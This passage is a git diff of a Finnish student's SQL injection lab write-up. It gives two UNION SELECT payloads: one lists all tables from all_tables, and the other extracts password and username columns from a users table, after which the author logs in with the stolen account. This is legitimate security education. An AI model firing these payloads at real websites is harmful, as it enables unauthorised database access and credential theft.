@@ -161,4 +161,31 @@ f.)
 g.)
 
 
+Etsin kaikki taulut tietokannasta
 
+'union+select+table_name,'123'+from+all_tables--
+
+![user1](https://github.com/AkiAleksi/h5/assets/112399816/088dba52-1367-410c-a349-a9108927e78d)
+
+
+
+![user2](https://github.com/AkiAleksi/h5/assets/112399816/1993c581-7e6a-4209-a78e-a30807da7946)
+
+
+Löytyi PASSWORD_ ja USERNAME_ sarakkeet
+
+![Screenshot 2023-11-25 at 12 53 09](https://github.com/AkiAleksi/h5/assets/112399816/75ec55ae-f133-4273-a09f-b0a3406db76e)
+
+'+union+select+PASSWORD_RNBGTX,USERNAME_ECTSRI+from+USERS_VYMYAO--
+
+
+![info](https://github.com/AkiAleksi/h5/assets/112399816/2e9d88f1-7fb7-44bc-8d93-30671a33410d)
+
+
+Kirjauduin tiedoilla MY account
+
+
+![okkkk](https://github.com/AkiAleksi/h5/assets/112399816/344ac34f-7b55-4826-bfc8-baf0cd398285)
+
+
+h.)
